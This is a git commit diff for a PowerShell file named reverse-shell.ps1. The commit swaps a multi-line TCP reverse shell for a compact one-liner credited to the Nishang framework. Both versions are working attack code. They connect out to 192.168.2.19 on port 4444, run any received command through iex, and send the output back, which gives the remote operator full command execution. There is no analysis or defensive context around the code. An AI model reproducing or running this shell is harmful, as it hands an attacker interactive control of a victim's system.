f3942b45e3c97caef9f631c048dc46d3290ddadd
Israel Hall Leighton <leightonisrael2014@gmail.com>
2024-07-04 13:23:34 -0300

    Update reverse-shell.ps1

--- reverse-shell.ps1
+++ reverse-shell.ps1
@@ -1,12 +1,2 @@
-$client = New-Object System.Net.Sockets.TCPClient('192.168.2.19',4444);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = ([text.encoding]::ASCII).GetString($bytes,0, $i);
-    $sendback = iex $data 2>&1 | Out-String;
-    $sendback2 = ($sendback + 'PS ' + (pwd).Path + '> ');
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-};
-$client.Close();
+#A simple and small reverse shell by samratashok's Nishang framework. Change the Host IP Address and Port according to your setup as described in the README file of the script. 
+$sm=(New-Object Net.Sockets.TCPClient("192.168.2.19",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
